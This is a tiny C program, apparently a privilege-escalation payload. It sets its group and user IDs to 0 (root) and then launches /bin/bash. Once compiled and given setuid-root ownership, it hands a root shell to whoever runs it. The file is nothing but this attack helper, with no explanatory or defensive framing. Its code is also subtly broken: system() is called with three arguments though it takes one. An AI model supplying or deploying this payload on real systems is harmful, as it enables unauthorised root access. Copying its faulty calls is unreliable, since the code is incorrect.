#include <unistd.h>

main( int argc, char ** argv, char ** envp )
{
    setgid(0);
    setuid(0);
    system("/bin/bash", argv, envp);
    return 0;
}
